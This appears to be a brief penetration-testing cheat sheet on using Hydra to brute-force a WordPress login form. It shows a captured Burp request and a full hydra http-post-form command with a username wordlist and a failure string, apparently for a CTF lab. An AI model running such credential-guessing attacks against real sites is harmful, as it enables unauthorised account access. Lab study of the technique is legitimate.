# Hydra


## Bruteforce HTTP Form

To bruteforce a Login catch the request with burpsuite and for a hydra command.

Burpsuite Request
```
POST /wp-login.php HTTP/1.1
Host: 10.38.1.111
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: http://10.38.1.111
DNT: 1
Connection: close
Referer: http://10.38.1.111/wp-login.php
Cookie: s_fid=68C1BD34EC9C4864-1C81564B06522EDF; s_nr=1643752744400; s_cc=true; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1

log=admin&pwd=123456&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.38.1.111%2Fwp-admin%2F&testcookie=1
```

Command:
```console
root@machine:~$ hydra -vV -L fsocity.dic.uniq -p wedontcare 192.168.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'

Options:
    -vV     verbose mode
    -L      use wordlist for Username
    -p      use given password
    -http-post-form     request type

Payload:
    '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

`^USER^` & ``^PASS^`` are used as placeholder. 
``"F=Invalid username"`` is the string for the error message.
---
